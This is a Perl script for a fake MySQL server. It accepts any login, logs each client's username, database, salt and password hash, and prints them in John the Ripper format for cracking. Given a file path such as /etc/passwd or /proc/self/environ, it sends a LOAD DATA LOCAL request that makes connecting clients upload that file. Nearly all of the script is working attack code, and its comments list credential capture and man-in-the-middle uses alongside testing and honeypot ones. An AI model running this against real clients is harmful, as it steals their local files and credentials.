#!/usr/bin/perl
#
# fake-mysql-server - Use cases:
#   - Test clients for insecure use of LOAD DATA LOCAL
#        https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html
#   - Testing source code but do not have the db schema
#   - Testing for client connect back services
#   - Useful in domain takeover or DNS rebinding attack's
#   - Capture db names, and session creds
#   - Manipulate query response data (MITM?) 
#   - Honeypot
#   - Fun and profit? }:$
#
# Dependencies:
#   yum install perl-ExtUtils-MakeMaker perl-Digest-SHA1
#   wget -c https://cpan.metacpan.org/authors/id/P/PH/PHILIPS/DBIx-MyServer-0.42.tar.gz -O - | tar -xz
#   cd DBIx-MyServer-0.42 && perl Makefile.PL && make && make install
#
# This is just a modifed version of 'echo.pl' in DBIx-MyServer-0.42/examples/
# Accepts any username or password
#
# Tested clients:
#   - mysql command line
#   - php
#
# [/csh:]> 07/31/2020
#
# References:
# https://metacpan.org/pod/DBIx::MyServer
# https://github.com/rapid7/metasploit-framework/blob/master//modules/auxiliary/server/capture/mysql.rb
# https://www.percona.com/blog/2019/02/06/percona-responds-to-mysql-local-infile-security-issues/
# https://github.com/allyshka/Rogue-MySql-Server
# https://hackerone.com/reports/719875
# https://lightless.me/archives/read-mysql-client-file.html
# https://github.com/cyrus-and/mysql-unsha1
#
use strict;
use feature qw(switch);
use Socket;
use DBIx::MyServer;

my($num_args) = $#ARGV + 1;
if($num_args > 2 || $num_args < 1) {
    printf("Usage: \n* SQL echo server\n\t$0 <port>\n\n");
    printf("* Trigger client LFI + SQL echo server\n\t$0 <port> <remote file>\n\n");
    exit;
}

my($port) = $ARGV[0];
my($file) = $ARGV[1]; # /proc/self/environ, /etc/passwd, etc...

socket(SERVER_SOCK, AF_INET, SOCK_STREAM, getprotobyname('tcp'));
setsockopt(SERVER_SOCK, SOL_SOCKET, SO_REUSEADDR, pack("l", 1));
bind(SERVER_SOCK, sockaddr_in($port, INADDR_ANY)) || die "bind: $!";
listen(SERVER_SOCK,1);

while(1) {
	my($remote_paddr) = accept(my $remote_socket, SERVER_SOCK);
	my($myserver) = DBIx::MyServer->new(socket => $remote_socket, banner => "Fake-MySQL-Server");

	# These three together are identical to $myserver->handshake()
	# which uses the default authorize() handler
	$myserver->sendServerHello();
	my($sqluser, $dbname) = $myserver->readClientHello();
	$myserver->sendOK();

	if(!$dbname) { $dbname = '(none)'; }

	# Trigger LOAD DATA INFILE on client # Send us the file
	# can only do this once and then connection is broken for some reason
	# client connection will continue on retry
        # todo: fix it, add ability for mutiple files?
	if($file) {
		my($LFIPacket) = getFilePacket($file);
		send($remote_socket, $LFIPacket, 0);
		$file = undef;
	}

	my($clientAddr, $passwdSalt, $passwdHash, $srvBanner);

 	eval {
   		my $hersockaddr = getpeername($myserver->getSocket());
   		my ($port, $iaddr) = sockaddr_in($hersockaddr);
   		$clientAddr = inet_ntoa($iaddr);
	};


	$srvBanner  = $myserver->[9]; # $myserver->[MYSERVER_BANNER]
	$passwdSalt = unpack('H*', $myserver->[12]); # $myserver->[MYSERVER_SALT]
	$passwdHash = unpack('H*', $myserver->[6]); # $myserver->[MYSERVER_SCRAMBLE]

	printf("Local Banner: $srvBanner\n"); # $myserver->[MYSERVER_BANNER]
	printf("Connection From: $clientAddr\n\tDatabase:$dbname\n\tUsername: $sqluser\n\tSalt: $passwdSalt\n\tHash: $passwdHash\n");

	# Crack using John + wordlist
	# john --wordlist=./words.list ./passwd.file
	# ref: https://www.portcullis.co.uk/cracking-mysql-network-authentication-hashes-with-john-the-ripper/
	printf("\tJohnTheRipper Format:\n\t\t$sqluser:\$mysqlna\$$passwdSalt*$passwdHash\n\n");

	while(1) {
		my($command, $data) = $myserver->readCommand();
		#printf("Command: $command - Data: $data\n");
		printf("Data: $data\n");

		given($command) {
			when(1) {
				#printf("Command: COM_QUIT\n");
				# get $file agian on reconnect?
				# $file = $ARGV[1];
				last;
			}

			when(3) {
				# Just send some bogus data back to client
				# Manipulate query response/data?
				# +------+
				# | id   |
				# +------+
				# | 1337 |
				# +------+
				# 1 row in set (0.00 sec)
				$myserver->sendDefinitions([$myserver->newDefinition(name => 'id')]);
				$myserver->sendRows([['1337']]);
			}

  			default {
				#printf("Unknown Command: $command\n");
				last;
			}
		}
	}
}

# LOAD DATA LOCAL packet
sub getFilePacket {
        my $filename = shift;
        my $packet  = '';
        my $f  = chr(0xfb);
           $f .= $filename;

        $packet  = chr(length($f));
        $packet .= chr(0x00);
        $packet .= chr(0x00);
        $packet .= chr(0x01); # packet num
        $packet .= $f;

        #printf("File: %s\n",$filename);
        #printf("Packet: %s\n",unpack('H*', $packet));
        return($packet);
}

